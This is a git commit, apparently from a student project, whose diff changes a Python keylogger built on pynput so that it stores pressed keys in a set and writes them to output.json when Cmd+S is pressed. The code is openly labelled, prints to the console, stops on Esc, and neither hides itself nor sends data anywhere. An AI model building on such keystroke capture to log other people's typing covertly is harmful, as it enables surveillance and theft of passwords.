e76d1acc4ec5fe051125b055fbef808c4e45f0cc
Erickk0 <erick.zeiler@student.hs-rm.de>
2024-08-31 10:48:50 +0200

    you can now store the keys that were pressed into a json file

--- keylogger.py
+++ keylogger.py
@@ -1,17 +1,42 @@
-from pynput.keyboard import Key, Controller, Listener
+import json
+from pynput.keyboard import Key, Listener
 
-keyboard = Controller()
+keys_pressed = set()
+last_key_pressed = None
 
 
 def on_press(key):
+    global last_key_pressed
     try:
-        print('key {0} pressed'.format(key.char))
+        last_key_pressed = key.char
+        print(f'key {key.char} pressed')
     except AttributeError:
-        print('key {0} pressed'.format(key))
+        last_key_pressed = str(key)
+        print(f'key {key} pressed')
+    keys_pressed.add(last_key_pressed)
+
+
+def write_json_file():
+    global last_key_pressed
+    data = {
+        "Keys pressed": list(keys_pressed)  # Convert set to list
+    }
+
+    # Write data to a JSON file
+    with open('output.json', 'w') as json_file:
+        json.dump(data, json_file, indent=4)
+
+    print("JSON file written with the keys pressed!")
 
 
 def on_release(key):
-    print('\n{0} released'.format(key))
+    print(f'\n{key} released')
+    keys_pressed.discard(key)
+
+    # Check if the command key is released
+    if key == Key.cmd and last_key_pressed == "s":
+        write_json_file()
+
     if key == Key.esc:
         # Stop listener
         return False
